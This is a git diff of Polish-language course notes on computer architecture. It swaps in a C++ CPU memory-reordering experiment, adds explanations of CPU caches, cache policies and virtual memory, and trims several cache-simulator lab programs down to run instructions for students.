+#define USE_SINGLE_HW_THREAD       0  // Supported on Linux, but not Cygwin or PS3
 
-void write_values() {
-    for (int i = 0; i < 100000; ++i) {
-        x.store(1, std::memory_order_relaxed);
-        y.store(1, std::memory_order_relaxed);
-    }
+#if USE_SINGLE_HW_THREAD
+#include <sched.h>
+#endif
+
+
+//-------------------------------------
+//  MersenneTwister
+//  A thread-safe random number generator with good randomness
+//  in a small number of instructions. We'll use it to introduce
+//  random timing delays.
+//-------------------------------------
+#define MT_IA  397
+#define MT_LEN 624
+
+class MersenneTwister
+{
+    unsigned int m_buffer[MT_LEN];
+    int m_index;
+
+public:
+    MersenneTwister(unsigned int seed);
+    // Declare noinline so that the function call acts as a compiler barrier:
+    unsigned int integer() __attribute__((noinline));
+};
+
+MersenneTwister::MersenneTwister(unsigned int seed)
+{
+    // Initialize by filling with the seed, then iterating
+    // the algorithm a bunch of times to shuffle things up.
+    for (int i = 0; i < MT_LEN; i++)
+        m_buffer[i] = seed;
+    m_index = 0;
+    for (int i = 0; i < MT_LEN * 100; i++)
+        integer();
 }
 
-void read_values() {
-    for (int i = 0; i < 100000; ++i) {
-        int r1 = y.load(std::memory_order_relaxed);
-        int r2 = x.load(std::memory_order_relaxed);
-        if (r1 == 1 && r2 == 0) {
-            count.fetch_add(1, std::memory_order_relaxed);
+unsigned int MersenneTwister::integer()
+{
+    // Indices
+    int i = m_index;
+    int i2 = m_index + 1; if (i2 >= MT_LEN) i2 = 0; // wrap-around
+    int j = m_index + MT_IA; if (j >= MT_LEN) j -= MT_LEN; // wrap-around
+
+    // Twist
+    unsigned int s = (m_buffer[i] & 0x80000000) | (m_buffer[i2] & 0x7fffffff);
+    unsigned int r = m_buffer[j] ^ (s >> 1) ^ ((s & 1) * 0x9908B0DF);
+    m_buffer[m_index] = r;
+    m_index = i2;
+
+    // Swizzle
+    r ^= (r >> 11);
+    r ^= (r << 7) & 0x9d2c5680UL;
+    r ^= (r << 15) & 0xefc60000UL;
+    r ^= (r >> 18);
+    return r;
+}
+
+
+//-------------------------------------
+//  Main program, as decribed in the post
+//-------------------------------------
+sem_t beginSema1;
+sem_t beginSema2;
+sem_t endSema;
+
+int X, Y;
+int r1, r2;
+
+void* thread1Func(void* param)
+{
+    MersenneTwister random(1);
+    for (;;)
+    {
+        sem_wait(&beginSema1);  // Wait for signal
+        while (random.integer() % 8 != 0) {}  // Random delay
+
+        // ----- THE TRANSACTION! -----
+        X = 1;
+#if USE_CPU_FENCE
+        asm volatile("mfence" ::: "memory");  // Prevent CPU reordering
+#else
+        //asm volatile("" ::: "memory");  // Prevent compiler reordering
+#endif
+        r1 = Y;
+
+        sem_post(&endSema);  // Notify transaction complete
+    }
+    return NULL;  // Never returns
+};
+
+void* thread2Func(void* param)
+{
+    MersenneTwister random(2);
+    for (;;)
+    {
+        sem_wait(&beginSema2);  // Wait for signal
+        while (random.integer() % 8 != 0) {}  // Random delay
+
+        // ----- THE TRANSACTION! -----
+        Y = 1;
+#if USE_CPU_FENCE
+        asm volatile("mfence" ::: "memory");  // Prevent CPU reordering
+#else
+        //asm volatile("" ::: "memory");  // Prevent compiler reordering
+#endif
+        r2 = X;
+
+        sem_post(&endSema);  // Notify transaction complete
+    }
+    return NULL;  // Never returns
+};
+
+int main()
+{
+    // Initialize the semaphores
+    sem_init(&beginSema1, 0, 0);
+    sem_init(&beginSema2, 0, 0);
+    sem_init(&endSema, 0, 0);
+
+    // Spawn the threads
+    pthread_t thread1, thread2;
+    pthread_create(&thread1, NULL, thread1Func, NULL);
+    pthread_create(&thread2, NULL, thread2Func, NULL);
+
+#if USE_SINGLE_HW_THREAD
+    // Force thread affinities to the same cpu core.
+    cpu_set_t cpus;
+    CPU_ZERO(&cpus);
+    CPU_SET(0, &cpus);
+    pthread_setaffinity_np(thread1, sizeof(cpu_set_t), &cpus);
+    pthread_setaffinity_np(thread2, sizeof(cpu_set_t), &cpus);
+#endif
+
+    // Repeat the experiment ad infinitum
+    int detected = 0;
+    for (int iterations = 1; ; iterations++)
+    {
+        // Reset X and Y
+        X = 0;
+        Y = 0;
+        // Signal both threads
+        sem_post(&beginSema1);
+        sem_post(&beginSema2);
+        // Wait for both threads
+        sem_wait(&endSema);
+        sem_wait(&endSema);
+        // Check if there was a simultaneous reorder
+        if (r1 == 0 && r2 == 0)
+        {
+            detected++;
+            printf("%d reorders detected after %d iterations\n", detected, iterations);
         }
     }
-}
-
-int main() {
-    int num_iterations = 100;
-    int reorderings = 0;
-
-    for (int i = 0; i < num_iterations; ++i) {
-        x.store(0, std::memory_order_relaxed);
-        y.store(0, std::memory_order_relaxed);
-
-        std::thread t1(write_values);
-        std::thread t2(read_values);
-
-        t1.join();
-        t2.join();
-
-        reorderings += count.load(std::memory_order_relaxed);
-        count.store(0, std::memory_order_relaxed);
-    }
-
-    std::cout << "Liczba reorderingow instrukcji po " << num_iterations << " iteracjach: " << reorderings << std::endl;
-
-    return 0;
+    return 0;  // Never returns
 }
 ```
 
@@ -2664,10 +2211,8 @@ Wady:
 
 Warto zauważyć, że technologia Hyper-threading nie jest jedyną dostępną techniką SMT (Simultaneous multithreading) - inne firmy, takie jak AMD, opracowały własne technologie SMT, takie jak SMT w procesorach AMD Ryzen, które oferują podobne możliwości wykonywania wielu wątków na jednym rdzeniu procesora. W zastosowaniach praktycznych, wybór procesora z technologią Hyper-threading czy innymi technologiami SMT zależy od potrzeb konkretnego projektu oraz rodzaju zadań, które mają być realizowane.
 
-W poniższym przykładzie przedstawiam uproszczony symulator procesora z technologią Hyper-threading. W tym przypadku zakładamy, że procesor ma jeden rdzeń i może jednocześnie wykonywać dwie operacje dodawania.
 
-
-Diagram procesora z technologią Hyper-threading
+Diagram procesora z technologią Hyper-threading:
 
 ```
 Procesor z technologią Hyper-threading
@@ -2751,37 +2296,8 @@ W funkcji `main`, tworzymy dwa wątki, które wykonują operacje dodawania równ
 
 ## Scenariusz problemu i porównanie rozwiązania na procesorze jedno- i wielordzeniowym.
 
-Scenariusz problemu:
-Przyjmijmy, że chcemy obliczyć wartości silni dla dużego zestawu liczb. Obliczenia te mają być wykonane sekwencyjnie dla każdej liczby w zestawie. Wartości silni obliczane są za pomocą iteracyjnej funkcji silni.
 
-Porównanie rozwiązań na procesorze jedno- i wielordzeniowym:
-
-1. Procesor jednordzeniowy:
-W przypadku procesora jednordzeniowego, wszystkie obliczenia muszą być wykonane sekwencyjnie, jeden zestaw obliczeń po drugim. Procesor wykonuje obliczenia w jednym wątku, co prowadzi do pełnego wykorzystania rdzenia tylko wtedy, gdy obciążenie jest ciągłe.
-
-Zalety:
-- Mniejsza złożoność programowania, brak konieczności zarządzania wątkami.
-- W przypadku małych zestawów danych, czas wykonania może być akceptowalny.
-
-Wady:
-- Dłuższy czas wykonania obliczeń, zwłaszcza przy dużych zestawach danych.
-- Brak możliwości równoczesnego wykonywania zadań, co może prowadzić do marnowania zasobów procesora.
-
-2. Procesor wielordzeniowy:
-W przypadku procesora wielordzeniowego, obliczenia mogą być równocześnie wykonywane na różnych rdzeniach, co pozwala na równoległe przetwarzanie danych. Wątki mogą być dynamicznie przydzielane do rdzeni, co pozwala na równoczesne obliczenia wartości silni dla różnych liczb.
-
-Zalety:
-- Krótszy czas wykonania obliczeń dzięki równoległemu przetwarzaniu.
-- Lepsze wykorzystanie zasobów procesora, zwłaszcza przy dużych zestawach danych.
-- Możliwość równoczesnego wykonywania różnych zadań, co prowadzi do większej efektywności.
-
-Wady:
-- Większa złożoność programowania związana z zarządzaniem wątkami i synchronizacją.
-- Potrzeba odpowiedniego podziału danych i zbalansowania obciążenia między rdzeniami.
-
-Podsumowując, w przypadku obliczania wartości silni dla dużego zestawu liczb, procesor wielordzeniowy może zapewnić znacznie lepszą wydajność niż procesor jednordzeniowy, ze względu na możliwość równoległego przetwarzania danych. Jednakże, wymaga to większej złożoności programowania związanej z zarządzaniem wątkami i synchronizacją, co może być trudniejsze do osiągnięcia niż w przypadku procesora jednordzeniowego.
-
-## Pomysły na dodatkowe zajęcia
+<!-- ## Pomysły na dodatkowe zajęcia
 
 - Omów wyzwania związane z programowaniem wielowątkowym, takie jak synchronizacja, wyścigi (race conditions) i blokady (deadlocks)
 
@@ -2805,13 +2321,87 @@ Podsumowując, w przypadku obliczania wartości silni dla dużego zestawu liczb,
 
 - Analiza wydajności i skalowania:
 	- Analiza wydajności programów na różnych konfiguracjach procesorów, takich jak jedno- i wielordzeniowe, a także o ocena wpływu potoku rozkazowego na wyniki.
-	- Analiza skalowania programów na różnych konfiguracjach procesorów, szczególnie w przypadku programów wielowątkowych, i ocenę wpływu potoku rozkazowego na skalowanie.
+	- Analiza skalowania programów na różnych konfiguracjach procesorów, szczególnie w przypadku programów wielowątkowych, i ocenę wpływu potoku rozkazowego na skalowanie. -->
 
 
-# Komunikacja z pamięcią - alokacja i odczyt pamięci
+# Komunikacja z pamięcią - odczyt 
 
 > Ref:
 > - [What Every Programmer Should Know About Memory](https://akkadia.org/drepper/cpumemory.pdf)
+
+
+## Rodzaje
+
+- Pamięć podręczna procesora: Jest to niewielka ilość pamięci wbudowana w jednostkę centralną komputera (CPU), która przechowuje często używane dane i instrukcje. Pamięć podręczna CPU przyspiesza procesorowi dostęp do danych i instrukcji, dzięki czemu nie musi on tak często sięgać do wolniejszej pamięci głównej lub urządzeń pamięci masowej.
+
+- Pamięć podręczna: Jest to niewielka część pamięci głównej (RAM) odłożona jako tymczasowy obszar przechowywania często używanych danych. Buforowanie pamięci pomaga poprawić wydajność aplikacji poprzez skrócenie czasu dostępu do danych z wolniejszych nośników pamięci, takich jak dyski twarde lub sieci.
+
+- Pamięć podręczna dysku: Jest to część pamięci głównej (RAM) używana do przechowywania danych, które zostały niedawno odczytane lub zapisane na dysku, takim jak dysk twardy lub dysk półprzewodnikowy. Buforowanie dysku pomaga zmniejszyć liczbę operacji odczytu i zapisu na dysku, poprawiając ogólną wydajność systemu.
+Pamięć podręczna przeglądarki: Jest to tymczasowy obszar przechowywania treści internetowych, takich jak strony HTML, obrazy i inne media, które są przechowywane w pamięci podręcznej przeglądarki internetowej. Gdy użytkownik odwiedza stronę internetową, jego przeglądarka przechowuje kopię zawartości strony w pamięci podręcznej. Gdy użytkownik ponownie odwiedza tę samą stronę internetową, przeglądarka może załadować zawartość z pamięci podręcznej zamiast pobierać ją ponownie, co może skrócić czas ładowania strony.
+
+- Rozproszona pamięć podręczna: Jest to pamięć podręczna, która jest współdzielona przez wiele komputerów w sieci i służy do przechowywania często używanych danych, które są rozproszone na wielu serwerach. Zmniejszając potrzebę dostępu do danych z wielu serwerów, rozproszone buforowanie może poprawić wydajność systemów rozproszonych. Rozproszone buforowanie może również poprawić skalowalność aplikacji, ponieważ dane mogą być buforowane w wielu lokalizacjach, co oznacza, że więcej jednoczesnych użytkowników może uzyskać dostęp do danych przy mniejszej liczbie żądań
+
+## Czym jest pamięć podręczna (w procesorze)?
+
+Pamięć podręczna (ang. cache memory) to typ pamięci w komputerze, który przechowuje dane, do których komputer często się odwołuje. W przeciwieństwie do głównej pamięci komputera (RAM), pamięć podręczna jest zazwyczaj znacznie szybsza, ale ma też znacznie mniejszą pojemność.
+
+Podstawowym celem pamięci podręcznej jest zwiększenie efektywności działania komputera. Gdy komputer potrzebuje danych, najpierw sprawdza, czy są one przechowywane w pamięci podręcznej. Jeżeli tak, dane są ładowane stamtąd, co jest szybsze niż ładowanie ich z pamięci RAM lub dysku twardego. Jeżeli danych nie ma w pamięci podręcznej, są one ładowane z innej pamięci i jednocześnie umieszczane w pamięci podręcznej, aby były dostępne na przyszłość.
+
+Pamięć podręczna jest organizowana na kilka poziomów (L1, L2, L3, itd.), gdzie L1 jest najbliżej procesora (i zazwyczaj najszybsza, ale też najmniejsza), a kolejne poziomy są coraz dalej (i zazwyczaj coraz wolniejsze, ale większe).
+
+Diagramy, które pokazują, jak działa pamięć podręczna, mogą być różne w zależności od szczegółów implementacji i architektury. Poniżej znajduje się proste wyjaśnienie na przykładzie trzech poziomów pamięci podręcznej (L1, L2, L3):
+
+```
+  CPU
+   |
+   | (najbliżej CPU, najmniejsza, najwyższa prędkość)
+   |
+  L1 Cache
+   |
+   | (dalej od CPU, większa, trochę wolniejsza)
+   |
+  L2 Cache
+   |
+   | (jeszcze dalej od CPU, jeszcze większa, jeszcze wolniejsza)
+   |
+  L3 Cache
+   |
+   | (najdalej od CPU, największa, najwolniejsza)
+   |
+  Main Memory (RAM)
+```
+
+*Pentium M* 
+
+|To Where   | Cycles|
+|-----------|--------|
+|Register   | ≤ 1    |
+|L1d        | ∼ 3    |
+|L2         | ∼ 14   |
+|Main Memory| ∼ 240  |
+
+Drepper, (what every programmer should know...)
+
+
+[Latency Numbers](https://colin-scott.github.io/personal_website/research/interactive_latency.html)
+
+## Pobieranie danych do pamięci podręcznej
+
+Dane są pobierane do pamięci podręcznej przez proces zwanym polityką pamięci podręcznej (ang. cache policy). Istnieją różne strategie zarządzania pamięcią podręczną, ale dwie najpopularniejsze to:
+
+1. **LRU (Least Recently Used):** W tej strategii, gdy pamięć podręczna jest pełna i trzeba dodać nowe dane, usuwany jest element, który nie był używany przez najdłuższy czas. Idea jest taka, że jeśli dane nie były używane od dawna, prawdopodobnie nie będą potrzebne w najbliższej przyszłości.
+
+2. **LFU (Least Frequently Used):** W tej strategii, gdy pamięć podręczna jest pełna i trzeba dodać nowe dane, usuwany jest element, który był używany najrzadziej. Ta strategia zakłada, że jeśli dane były rzadko używane w przeszłości, prawdopodobnie nie będą często używane w przyszłości.
+
+Gdy komputer potrzebuje danych, najpierw sprawdza, czy są one przechowywane w pamięci podręcznej. Jeżeli tak, dane są ładowane stamtąd, co jest znacznie szybsze niż ładowanie ich z pamięci RAM lub dysku twardego. To jest nazywane "trafieniem" (ang. cache hit). Jeżeli danych nie ma w pamięci podręcznej, to jest nazywane "pudłem" (ang. cache miss) i dane są ładowane z wolniejszego źródła (np. pamięci RAM lub dysku twardego), a następnie umieszczane w pamięci podręcznej, aby były dostępne na przyszłość.
+
+W przypadku pudła, dane mogą być ładowane do pamięci podręcznej na dwa główne sposoby:
+
+- **Polityka pobierania przy pudle (ang. fetch on miss):** Gdy dane nie są w pamięci podręcznej, są one pobierane z wolniejszego źródła i umieszczane w pamięci podręcznej.
+
+- **Polityka pobierania z wyprzedzeniem (ang. prefetch):** W tej strategii, komputer próbuje przewidzieć, jakie dane będą potrzebne w przyszłości i ładować je do pamięci podręcznej z wyprzedzeniem, zanim będą rzeczywiście potrzebne.
+
+Oczywiście, te strategie są uproszczeniami, a rzeczywiste systemy pamięci podręcznej mogą korzystać z bardziej skomplikowanych algorytmów i strategii, które biorą pod uwagę wiele czynników, takich jak lokalność odwołań do danych (tj. tendencja do odwoływania się do tych samych danych wielokrotnie w krótkim okresie czasu) czy hierarchię pamięci podręcznej.
 
 ## Nomenklatura
 
@@ -2829,101 +2419,48 @@ Level 1 data cache - 48 kB, 12 way, 64 sets, 64 B line size, latency 5, per core
 
 6. Per core: This specification is for an L1 data cache that is dedicated to each core in a multicore processor. Each core has its own L1 data cache, which can help improve performance by reducing contention for cache resources between cores.
 
-## Ćwiczenie
-
-Celem tego ćwiczenia jest napisanie prostego programu w języku C, który alokuje blok pamięci, zapisuje wartości do tego bloku i odczytuje wartości z tego bloku.
-
-**Lab_14**
-```c
-#include <stdio.h>
-#include <stdlib.h>
-
-int main() {
-    int *buffer;
-    int buffer_size = 10;
-
-    buffer = (int *) malloc(buffer_size * sizeof(int));
-
-    for (int i = 0; i < buffer_size; i++) {
-        buffer[i] = i;
-    }
-
-    for (int i = 0; i < buffer_size; i++) {
-        printf("buffer[%d] = %d\n", i, buffer[i]);
-    }
-
-    free(buffer);
-    return 0;
-}
-```
 
 
-W poniższym programie w C++ przetestujemy dwa różne sposoby dostępu do pamięci: sekwencyjny i losowy. Porównamy czas wykonania obu podejść, które mogą wpływać na wykorzystanie pamięci cache.
+## Pamięć Wirtualna
+
+Pamięć wirtualna to technika zarządzania pamięcią, która pozwala na wykorzystanie dysku twardego jako rozszerzenia pamięci fizycznej RAM. Dzięki temu programy mogą używać więcej pamięci, niż jest dostępna fizycznie w systemie.
+
+System operacyjny przypisuje każdemu programowi obszar pamięci, który nazywany jest przestrzenią adresową. Każda przestrzeń adresowa jest podzielona na bloki o stałym rozmiarze, zwane stronami. W systemach z pamięcią wirtualną, nie wszystkie strony muszą być zawsze przechowywane w pamięci RAM. Kiedy program próbuje odwołać się do strony, która nie jest obecnie w pamięci, system operacyjny przenosi ją z dysku do RAM.
+
+Pamięć wirtualna ma kilka zalet. 
+- Pozwala na uruchamianie programów, które wymagają więcej pamięci, niż jest dostępne. 
+- Poprawia bezpieczeństwo, ponieważ programy nie mają bezpośredniego dostępu do pamięci RAM, co utrudnia wykorzystanie błędów w programach do ataków na system.
+
+Jednak pamięć wirtualna ma też swoje wady. Przede wszystkim, jest wolniejsza od pamięci RAM, ponieważ odczyt i zapis na dysk są wolniejsze niż operacje w pamięci. Po drugie, jeśli system operacyjny musi często przenosić strony pomiędzy RAM a dyskiem (co nazywa się "thrashing"), może to poważnie obniżyć wydajność systemu.
+
+
+Mechanizmy potrzebne do implementacji pamięci wirtualnej:
+
+1. **Obsługa stronicowania pamięci (paging):** Procesory muszą mieć mechanizm umożliwiający mapowanie przestrzeni adresowej na strony pamięci. W rzeczywistości to stronicowanie umożliwia obsługę pamięci wirtualnej - strony, które nie są obecnie potrzebne, mogą być przeniesione na dysk twardy, a następnie ponownie załadowane do pamięci RAM, gdy są potrzebne.
+
+2. **Mechanizm zarządzania pamięcią (MMU - Memory Management Unit):** MMU to sprzętowy komponent procesora, który przetwarza i kontroluje wszystkie odwołania do pamięci. MMU jest odpowiedzialny za translację adresów wirtualnych na adresy fizyczne. Jest to kluczowe dla obsługi pamięci wirtualnej, ponieważ pozwala programom "myśleć", że mają dostęp do ciągłego bloku pamięci, podczas gdy w rzeczywistości ich strony mogą być rozproszone w różnych miejscach pamięci fizycznej.
+
+3. **Mechanizmy ochrony pamięci:** Procesory muszą mieć mechanizmy umożliwiające kontrolę dostępu do pamięci. Dzięki temu system operacyjny może zapobiegać sytuacjom, w których jeden proces próbuje odczytać lub zapisywać w obszarze pamięci innego procesu.
+
+4. **Mechanizmy obsługi przerwań:** Kiedy program próbuje odwołać się do strony, która nie jest obecnie w pamięci, procesor generuje przerwanie (tzw. page fault), które jest obsługiwane przez system operacyjny. System operacyjny wtedy przenosi stronę z dysku do pamięci i kontynuuje wykonywanie programu.
+
+Każda z tych cech jest kluczowa dla obsługi pamięci wirtualnej i jest obecna we współczesnych procesorach.
+
 
 **Lab_15**
-```cpp
-#include <iostream>
-#include <chrono>
-#include <vector>
-#include <random>
 
-using namespace std;
-using namespace std::chrono;
+W poniższym programie przetestujemy dwa różne sposoby dostępu do pamięci: sekwencyjny i losowy. Porównamy czas wykonania obu podejść, które mogą wpływać na wykorzystanie pamięci cache.
 
-const int array_size = 1000000;
-const int num_iterations = 10;
 
-void access_memory_sequentially(vector<int> &data) 
-{
-    for (int i = 0; i < array_size; ++i) 
-        data[i]++;
-}
-
-void access_memory_randomly(vector<int> &data) 
-{
-    default_random_engine generator;
-    uniform_int_distribution<int> distribution(0, array_size - 1);
-
-    for (int i = 0; i < array_size; ++i) 
-    {
-        int random_index = distribution(generator);
-        data[random_index]++;
-    }
-}
-
-void test_memory_access(const string &access_type, void (*access_func)(vector<int> &)) 
-{
-    vector<int> data(array_size, 0);
-
-    auto start_time = high_resolution_clock::now();
-
-    for (int i = 0; i < num_iterations; ++i) 
-        access_func(data);
-
-    auto end_time = high_resolution_clock::now();
-    auto duration = duration_cast<milliseconds>(end_time - start_time).count();
-    cout << "Czas wykonania (" << access_type << "): " << duration << " ms" << endl;
-}
-
-int main() 
-{
-    for (int i = 0; i < 100; ++i)
-    {
-        //test_memory_access("sekwencyjny", access_memory_sequentially);
-        //test_memory_access("losowy", access_memory_randomly);
-    }
-    return 0;
-}
+Ćwiczenie:
+Proszę uruchomić program, opisać w sprawozdaniu jego wynik.
+```
+$lab_15.exe <iterations> <seq/random>
+              <50-1000>    <seq/random>
 ```
 
-Ten program tworzy wektor danych o stałym rozmiarze, a następnie wykonuje sekwencyjny i losowy dostęp do pamięci. Dostęp sekwencyjny polega na iteracji przez wektor i inkrementacji każdego elementu, podczas gdy dostęp losowy polega na wyborze losowego indeksu wektora i inkrementacji odpowiadającego elementu.
+Należy modyfikować ilość iteracji: 50 75 100, uruchamiając dla dostępu sekwencyjnego i losowego.
 
-Po skompilowaniu i uruchomieniu programu, na konsoli zostaną wyświetlone wyniki czasu wykonania dostępu do pamięci dla obu podejść. Porównując te wyniki, można zauważyć, że dostęp sekwencyjny jest zazwyczaj szybszy niż losowy. Wynika to z lepszego wykorzystania pamięci cache przez dostęp sekwencyjny, który ma bardziej przewidywalny wzorzec dostępu do pamięci, co pozwala na bardziej efektywne użycie cache.
-
-W praktyce, optymalizacja dostępu do pamięci może prowadzić do znacznego przyspieszenia obliczeń, zwłaszcza w przypadku algorytmów o dużym zapotrzebowaniu na pamięć. Optymalizacja może obejmować zarówno wybór odpowiedniego sposobu dostępu do pamięci, jak i projektowanie algorytmów z uwzględnieniem ograniczeń pamięci cache.
-
-
-Poniżej znajduje się prosty symulator procesora z pamięcią cache w Pythonie, który ilustruje różnice w czasie dostępu do pamięci sekwencyjnie i losowo.
 
 > Ref:
 > - [Memory part 2: CPU caches](https://lwn.net/Articles/252125/)
@@ -2939,349 +2476,43 @@ Zmiana parametrów symulatora (rozmiar pamięci, rozmiar cache, liczba iteracji)
 Symulator pamięci podręcznej (cache) typu direct-mapped
 
 **Lab_17**
-```cpp
-#include <iostream>
-#include <vector>
-#include <cstdlib>
-#include <ctime>
-
-class CacheEntry {
-public:
-    int tag;
-    bool valid;
-    CacheEntry() : tag(-1), valid(false) {}
-};
-
-class Cache {
-private:
-    int cacheSize;
-    int blockSize;
-    int numCacheLines;
-    int mainMemoryAccessTime;
-    std::vector<CacheEntry> cacheEntries;
-    int cacheHit;
-    int cacheMiss;
-
-    void prefetch(int address) {
-        int nextAddress = address + blockSize;
-        int index = (nextAddress / blockSize) % numCacheLines;
-        int tag = nextAddress / blockSize / numCacheLines;
-
-        cacheEntries[index].tag = tag;
-        cacheEntries[index].valid = true;
-    }
-
-public:
-    Cache(int cacheSize, int blockSize, int mainMemoryAccessTime)
-        : cacheSize(cacheSize), blockSize(blockSize), mainMemoryAccessTime(mainMemoryAccessTime) {
-        numCacheLines = cacheSize / blockSize;
-        cacheEntries.resize(numCacheLines);
-        cacheHit = 0;
-        cacheMiss = 0;
-    }
-
-    bool access(int address) {
-        int index = (address / blockSize) % numCacheLines;
-        int tag = address / blockSize / numCacheLines;
-
-        if (cacheEntries[index].valid && cacheEntries[index].tag == tag) {
-            cacheHit++;
-            return true; // Cache hit
-        } else {
-            cacheMiss++;
-            cacheEntries[index].tag = tag;
-            cacheEntries[index].valid = true;
-
-            //prefetch,
-            //cacheEntries[index].data = read_line_from_main_memory(address)
-
-            return false; // Cache miss
-        }
-    }
-
-    void printStats() {
-        std::cout << "Cache hits: " << cacheHit << std::endl;
-        std::cout << "Cache misses: " << cacheMiss << std::endl;
-        std::cout << "Hit ratio: " << (double)cacheHit / (cacheHit + cacheMiss) << std::endl;
-        std::cout << "Average access time: "
-                  << (cacheHit + cacheMiss * mainMemoryAccessTime) / (double)(cacheHit + cacheMiss)
-                  << " cycles" << std::endl;
-    }
-};
-
-int main() {
-    srand(time(NULL));
-    int cacheSize = 1024;         // 1KB cache
-    int blockSize = 32;           // 32B block size
-    int mainMemoryAccessTime = 50; // 50 cycles
-    Cache cache(cacheSize, blockSize, mainMemoryAccessTime);
-
-    int numAccesses = 10000;
-    int memorySize = 4096; // 4KB main memory
-
-    // Sequential access
-    for (int i = 0; i < numAccesses; i++) {
-        cache.access(i % memorySize);
-    }
-
-    std::cout << "Sequential access:" << std::endl;
-    cache.printStats();
-
-    // Reset the cache for the random test
-    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime);
-
-    // Random access
-    for (int i = 0; i < numAccesses; i++) {
-        cache.access(rand() % memorySize);
-    }
-
-    std::cout << "Random access:" << std::endl;
-    cache.printStats();
-
-    return 0;
-}
-```
 
 
-**Prefetch**
+Proszę uruchomić program, opisać w sprawozdaniu jego wynik. Należy kilka razy zmodyfikować parametry:
 
-**Lab_18**
-```cpp
-#include <iostream>
-#include <vector>
-#include <cstdlib>
-#include <ctime>
-#include <deque>
-#include <random>
-
-class CacheEntry
-{
-public:
-    uint64_t tag;
-    bool valid;
-    CacheEntry() : tag(-1), valid(false) {}
-};
-
-class Cache
-{
-    uint64_t cacheSize;
-    uint64_t blockSize;
-    uint64_t numCacheLines;
-    uint64_t mainMemoryAccessTime;
-
-    std::vector<CacheEntry> cacheEntries;
-
-    uint64_t prefetchDistance;
-    uint64_t cacheHit;
-    uint64_t cacheMiss;
-    uint64_t cachePrefetch;
-
-    void prefetch(uint64_t address)
-    {
-        for (uint64_t i = 1; i <= prefetchDistance; i++)
-        {
-            uint64_t nextAddress = address + i * blockSize;
-            uint64_t index = (nextAddress / blockSize) % numCacheLines;
-            uint64_t tag = nextAddress / blockSize / numCacheLines;
-
-            if (cacheEntries[index].valid && cacheEntries[index].tag == tag)
-            {
-                cacheHit++;
-            }
-            else
-            {
-                cacheEntries[index].tag = tag;
-                cacheEntries[index].valid = true;
-
-                cachePrefetch++;
-            }
-        }
-    }
-
-public:
-    Cache(uint64_t cacheSize, uint64_t blockSize, uint64_t mainMemoryAccessTime, uint64_t prefetchDistance)
-        : cacheSize(cacheSize),
-          blockSize(blockSize),
-          mainMemoryAccessTime(mainMemoryAccessTime),
-          prefetchDistance(prefetchDistance)
-    {
-        numCacheLines = cacheSize / blockSize;
-        cacheEntries.resize(numCacheLines);
-        cacheHit = 0;
-        cacheMiss = 0;
-        cachePrefetch = 0;
-    }
-
-    bool access(uint64_t address, bool prefetchEnabled = false)
-    {
-        uint64_t index = (address / blockSize) % numCacheLines;
-        uint64_t tag = address / blockSize / numCacheLines;
-
-
-        if (cacheEntries[index].valid && cacheEntries[index].tag == tag) 
-        {
-            cacheHit++;
-            return true; // Cache hit
-        }
-
-        cacheMiss++;
-        cacheEntries[index].tag = tag;
-        cacheEntries[index].valid = true;
-
-        if (prefetchEnabled) 
-        {
-            prefetch(address);
-        }
-
-        return false; // Cache miss
-        
-    }
-
-    void printStats() const
-    {
-        std::cout << "Cache hits: " << cacheHit << std::endl;
-        std::cout << "Cache misses: " << cacheMiss << std::endl;
-        std::cout << "Cache prefetches: " << cachePrefetch << std::endl;
-        std::cout << "Hit ratio: " << static_cast<double>(cacheHit) / static_cast<double>(cacheHit + cacheMiss) << std::endl;
-        std::cout << "Average access time: "
-            << static_cast<double>(cacheHit + (cacheMiss + cachePrefetch) * mainMemoryAccessTime) / static_cast<double>(cacheHit + cacheMiss + cachePrefetch)
-            << " cycles" << std::endl << std::endl;
-    }
-};
-
-int main()
-{
-    uint64_t cacheSize = 32LL * 1024LL * 1024LL;          // 1KB cache
-    uint64_t blockSize = 32;            // 32B block size
-    uint64_t mainMemoryAccessTime = 50; // 50 cycles
-    uint64_t prefetchDistance = 8;      // prefetch distance of 4 blocks
-
-    uint64_t numAccesses = 10000;
-    uint64_t memorySize = 4096LL * 1024LL * 1024LL; // 4KB main memory
-
-    std::default_random_engine generator;
-    std::uniform_int_distribution<uint64_t> distribution(0, memorySize - 1);
-
-    Cache cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);
-    // Sequential access without prefetching
-    for (uint64_t i = 0; i < numAccesses; i++) {
-        cache.access(i % memorySize);
-    }
-
-    std::cout << "Sequential access without prefetching:" << std::endl;
-    cache.printStats();
-
-    // Reset the cache for the next test
-    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);
-
-    // Sequential access with prefetching
-    for (uint64_t i = 0; i < numAccesses; i++) {
-        cache.access(i % memorySize, true);
-    }
-
-    std::cout << "Sequential access with prefetching:" << std::endl;
-    cache.printStats();
-
-    // Reset the cache for the next test
-    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);
-
-    // Random access without prefetching
-    for (uint64_t i = 0; i < numAccesses; i++) {
-        cache.access(distribution(generator) % memorySize);
-    }
-
-    std::cout << "Random access without prefetching:" << std::endl;
-    cache.printStats();
-
-    // Reset the cache for the next test
-    cache = Cache(cacheSize, blockSize, mainMemoryAccessTime, prefetchDistance);
-
-    // Random access with prefetching
-    for (uint64_t i = 0; i < numAccesses; i++) {
-        cache.access(distribution(generator) % memorySize, true);
-    }
-
-    std::cout << "Random access with prefetching:" << std::endl;
-    cache.printStats();
-
-    return 0;
-}
+- ```-c 1024 -b 32 -n 10000 -m 2048```
+- ```-c 1024 -b 64 -n 10000 -m 2048```
+- ```-c 2048 -b 32 -n 10000 -m 4096```
+- ```-c 2048 -b 64 -n 10000 -m 4096```
+- inna konfiguracja wg uznania z taką samą liczbą iteracji
+- inna konfiguracja wg uznania z taką samą liczbą iteracji
 
 ```
+$lab_17.exe -c 1024 -b 32 -n 10000 -m 1024
 
-
-Ćwiczenie 3: Obsługa przerwań - prosty timer
-
-Celem tego ćwiczenia jest napisanie prostego programu w języku C, który używa przerwań do odmierzania czasu. W tym celu można skorzystać z biblioteki `signal.h`.
-
-**Lab_19**
-```c
-#include <stdio.h>
-#include <signal.h>
-#ifndef    _MSC_VER
-#include <unistd.h>
-#endif
-
-// linux: gcc lab_19.cpp -o lab_19
-
-void timer_handler(int signum) {
-    static int counter = 0;
-    printf("Timer expired %d times.\n", ++counter);
-}
-
-int main() {
-
-    #ifndef    _MSC_VER
-    struct sigaction sa;
